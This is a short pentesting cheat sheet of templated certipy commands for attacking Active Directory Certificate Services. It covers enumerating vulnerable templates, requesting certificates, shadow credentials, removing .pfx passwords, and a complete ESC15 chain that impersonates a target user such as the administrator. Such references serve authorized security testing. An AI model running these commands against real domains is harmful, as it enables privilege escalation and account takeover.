# certipy
#target/remote #os/linux #cat/ad

## Find templates
```
certipy find -<type|enabled> -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -stdout -json -timeout 2
```

## Request template
```
certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template <template>
```

## Shadow cred
```
certipy shadow auto -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -account <target_obj>
```

## Authenticate using .pfx
```
certipy auth -pfx <pfx> -username '<user>' -domain <domain> -dc-ip <dc_ip>
```

## Remove password from .pfx
```
certipy cert -pfx <protected_pfx> password <password> -export -out <unprotected_pfx|nopass.pfx>
```

## Dump info from .pfx
```
certipy cert -pfx <pfx> -out temp.pem;openssl x509 -in temp.pem -text -noout;rm temp.pem
```

## Export .crt and .key from .pfx file
```
certipy cert -pfx <pfx> -nocert -out <out_key>;certipy cert -pfx <pfx> -nokey -out <out_crt>
```

## ESC15 (scenario B)
```
certipy req -u '<user>'@<domain> <auth> -dc-ip <dc_ip> -target <ca_fqdn> -ca <ca> -template <vuln_template> -upn '<target_user>@<domain>' -application-policies 'Certificate Request Agent'; certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template '<user_template|User>' -pfx <target_user|administrator>.pfx -on-behalf-of '<netbios>\<target_user>'; certipy auth -pfx '<target_user>.pfx' -dc-ip <dc_ip>
```
